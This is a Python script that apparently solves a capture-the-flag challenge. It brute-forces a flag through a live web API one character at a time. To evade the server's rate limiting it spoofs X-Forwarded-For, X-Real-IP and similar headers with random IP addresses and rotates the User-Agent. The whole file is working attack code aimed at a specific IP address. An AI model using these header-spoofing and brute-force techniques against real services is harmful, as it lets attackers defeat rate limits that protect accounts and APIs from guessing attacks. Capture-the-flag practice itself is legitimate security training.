#!/usr/bin/env python3
"""
Rate Limit Bypass Techniques:
1. X-Forwarded-For header spoofing
2. Different User-Agent
3. Session rotation
4. IP rotation via proxies
"""

import requests
import string
import time
import random

url = "http://23.179.17.92:5559"
api_url = f"{url}/api/flag"

FLAG_LENGTH = 32
charset = string.ascii_letters + string.digits + '{}_!@#$%^&*()-=+[]|;:,.<>?/'

print("="*70)
print("HIT YOUR LIMIT - RATE LIMIT BYPASS")
print("="*70)

def make_request(guess, attempt=0):
    """Make request with rate limit bypass headers"""
    
    # Generate random IP for X-Forwarded-For
    fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    headers = {
        'X-Forwarded-For': fake_ip,
        'X-Real-IP': fake_ip,
        'X-Originating-IP': fake_ip,
        'X-Remote-IP': fake_ip,
        'X-Remote-Addr': fake_ip,
        'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,600)}.36',
    }
    
    try:
        r = requests.get(api_url, params={'guess': guess}, headers=headers, timeout=10)
        return r
    except Exception as e:
        print(f"    [!] Error: {e}")
        return None

# Test bypass
print("\n[*] Testing rate limit bypass...")
for i in range(10):
    r = make_request("CIT{")
    if r:
        print(f"    Request {i+1}: Status {r.status_code}")
        if r.status_code == 429:
            print(f"    [!] Still rate limited")
            break
    time.sleep(0.1)

# Start brute forcing with bypass
known_flag = "CIT{"
print(f"\n[*] Starting brute force with bypass from: {known_flag}")

while len(known_flag) < FLAG_LENGTH:
    print(f"\n[*] Current: {known_flag} ({len(known_flag)}/{FLAG_LENGTH})")
    found = False
    
    for char in charset:
        guess = known_flag + char
        
        r = make_request(guess)
        
        if r and r.status_code == 200:
            print(f"    [+] Found: {char} -> {guess}")
            known_flag = guess
            found = True
            break
        elif r and r.status_code == 429:
            print(f"    [!] Rate limited even with bypass, waiting 5s...")
            time.sleep(5)
            # Retry with new IP
            r = make_request(guess)
            if r and r.status_code == 200:
                print(f"    [+] Found after retry: {char} -> {guess}")
                known_flag = guess
                found = True
                break
        
        # Small delay between attempts
        time.sleep(0.05)
    
    if not found:
        print(f"    [!] No character found, trying common endings...")
        for ending in ['}', '_', '-']:
            guess = known_flag + ending
            r = make_request(guess)
            if r and r.status_code == 200:
                print(f"    [+] Found: {ending} -> {guess}")
                known_flag = guess
                found = True
                break
        
        if not found:
            print(f"    [!] Stuck at: {known_flag}")
            break

print(f"\n{'='*70}")
print(f"[!!!] FINAL FLAG: {known_flag}")
print(f"{'='*70}")

# Verify
if len(known_flag) == FLAG_LENGTH:
    r = make_request(known_flag)
    if r and r.status_code == 200:
        print(f"[✓] Flag verified!")
        print(f"\nFLAG: {known_flag}")
